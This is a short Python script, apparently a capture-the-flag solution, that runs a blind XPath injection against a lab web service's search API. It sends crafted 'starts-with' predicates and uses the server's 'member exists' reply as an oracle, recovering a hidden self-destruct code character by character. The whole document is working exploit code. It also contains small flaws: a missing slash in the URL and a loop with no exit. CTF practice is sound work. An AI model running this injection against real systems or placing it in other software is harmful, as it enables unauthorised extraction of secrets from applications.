#!/usr/bin/env python3

import requests
import string

url = "http://10.10.10.10:10000"
printable = string.printable.replace("'", "")
r = requests.post(url + "api/search", json={"search": "' or 'starts-with(//selDestructCode,'C') or '"})
leaked_data = list("CHTB{")
while True:
	for character in printable:
		r = requests.post(
			url + "api/search", 
			json={"search": f"' or 'starts-with(//selDestructCode[starts-with(.,'{''.join(leaked_data) + character}')] or '"
			},
		)
		print(f"trying{''.join(leaked_data) + character}")
		if r.json() == {"message": "This military staff member exists"}:
			leaked_data.append(character)
			break
# while True:
# 	for character in printable:
# 		r = requests.post(
# 			url + "api/search", 
# 			json={"search": f"' or 'starts-with(//selDestructCode,'{''.join(leaked_data) + character}') or '"
# 			},
# 		)
# 		print(f"trying{''.join(leaked_data) + character}")
# 		if r.json() == {"message": "This military staff member exists"}:
# 			leaked_data.append(character)
# 			break

print(r.text)